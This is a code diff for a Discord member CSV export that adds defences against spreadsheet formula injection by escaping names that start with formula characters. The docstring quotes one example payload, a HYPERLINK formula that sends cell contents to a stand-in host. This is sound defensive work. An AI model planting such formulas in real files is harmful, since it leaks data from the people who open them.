@@ -28,12 +28,32 @@ class ExportPayload:
     data: bytes
 
 
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _neutralize_formula(value: str) -> str:
+    """Stop spreadsheets from evaluating a Discord name as a formula.
+
+    Usernames and display names are attacker-controlled, so a name such as
+    ``=HYPERLINK("http://example.invalid/"&A1,"x")`` would execute when the
+    export is opened in Excel or LibreOffice. Prefixing with an apostrophe
+    keeps the cell text intact while forcing it to be read as a literal.
+    """
+    if value.startswith(_FORMULA_PREFIXES):
+        return f"'{value}"
+    return value
+
+
 def _build_csv(members: Sequence[ExportMember]) -> bytes:
     output = StringIO(newline="")
     writer = csv.writer(output, lineterminator="\n")
     writer.writerow(("user_id", "username", "display_name"))
     writer.writerows(
-        (member.user_id, member.username, member.display_name)
+        (
+            member.user_id,
+            _neutralize_formula(member.username),
+            _neutralize_formula(member.display_name),
+        )
         for member in members
     )
     return output.getvalue().encode("utf-8")
